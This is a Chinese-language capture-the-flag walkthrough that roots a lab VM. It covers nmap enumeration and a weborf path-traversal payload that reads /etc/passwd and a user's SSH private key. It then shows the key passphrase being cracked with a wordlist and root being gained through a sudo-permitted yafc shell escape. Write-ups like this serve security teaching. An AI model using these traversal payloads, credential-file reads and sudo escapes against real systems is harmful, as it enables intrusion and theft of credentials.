## 靶机地址

[Proton Drive](https://drive.proton.me/urls/V0CPKF3BZW#Qc8GsNOxJNfn)

![image-20250324175845267](assets/image-20250324175845267.png)



## 信息收集

### nmap扫描

#### 准备阶段

```
mkdir nmapscan
```

![image-20250324175905002](assets/image-20250324175905002.png)

创建文件夹用来存放nmap扫描结果



#### 主机探测

```
nmap -sn 192.168.1.0/24
```

![image-20250324175937025](assets/image-20250324175937025.png)



#### 端口扫描

```
nmap -sT --min-rate 10000 -p- 192.168.1.6 -oA ./nmapscan/ports
```

![image-20250324180022762](assets/image-20250324180022762.png)

开放了：

- 22 ssh
- 80 http
- 8080 http-proxy



#### 提取端口信息

```
ports
```

![image-20250324180108893](assets/image-20250324180108893.png)



#### 详细结果扫描

```
nmap -sC -sT -p 22,80,8080 -O 192.168.1.6 -oA ./nmapscan/detail
```

![image-20250324180504899](assets/image-20250324180504899.png)

分析：

- 22 ssh
- 80 http
- 8080 http-proxy
- webofr



#### UDP扫描

```
nmap -sU --top-ports 20 192.168.1.6 -oA ./nmapscan/udp
```

![image-20250324180610446](assets/image-20250324180610446.png)



### 80端口

#### 访问192.168.1.67

![image-20250324180712062](assets/image-20250324180712062.png)

apache主页

查看源码，无内容



#### dirsearch目录扫描

```
dirsearch -u 192.168.1.6
```

![image-20250324180800607](assets/image-20250324180800607.png)

无结果



#### gobuster目录扫描

```
gobuster dir -u http://192.168.1.6 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

![image-20250324180931539](assets/image-20250324180931539.png)

无结果



### 8080端口

#### 访问192.168.1.6:8080

![image-20250324180916915](assets/image-20250324180916915.png)

weborf/0.12.2



#### 搜索相关漏洞

```
searchsploit weborf
```

![image-20250324181022006](assets/image-20250324181022006.png)

存在目录遍历漏洞



#### 保存漏洞

```
searchsploit -m linux/remote/14925.txt
cat 14925.txt
```

![image-20250324181129420](assets/image-20250324181129420.png)



#### 利用给出的payload

```
/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

![image-20250324181220366](assets/image-20250324181220366.png)

成功读取/etc/passwd

有一个普通用户tim



#### 构造payload读取tim的私钥

```
/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2ftim%2f.ssh%2fid_rsa
```

![image-20250324181409730](assets/image-20250324181409730.png)





#### 保存到本地

```
wget http://192.168.1.6:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2ftim%2f.ssh%2fid_rsa -O id_r
sa
cat id_rsa
```

![image-20250324181444755](assets/image-20250324181444755.png)



### 22端口

#### 修改私钥权限

```
chmod 600 id_rsa
```

![image-20250324181514211](assets/image-20250324181514211.png)



#### 尝试登录

```
ssh tim@192.168.1.6 -i id_rsa
```

![image-20250324181552739](assets/image-20250324181552739.png)

失败

需要密码



#### 利用RSAcrack爆破rsa

```
RSAcrack -k id_rsa -w /usr/share/wordlists/rockyou.txt
```

![image-20250324182159867](assets/image-20250324182159867.png)

得到tim密码

- ilovetim



#### ssh登录

```
ssh tim@192.168.1.6 -i id_rsa
```

![image-20250324182309297](assets/image-20250324182309297.png)

成功登录



## 提权

### 得到第一个flag

```
ls
cat user.txt
```

![image-20250324182333842](assets/image-20250324182333842.png)



### 执行sudo权限

```
sudo -l
```

![image-20250324182415893](assets/image-20250324182415893.png)

无密码执行yafc



### 执行yafc

```
sudo yafc
help
```

![image-20250324182659668](assets/image-20250324182659668.png)

![image-20250324182720280](assets/image-20250324182720280.png)



存在shell



### 执行shell

```
shell
```

![image-20250324182735977](assets/image-20250324182735977.png)

成功提权



### 得到第二个flag

```
cd /root
ls
cat root.txt
```

![image-20250324182754445](assets/image-20250324182754445.png)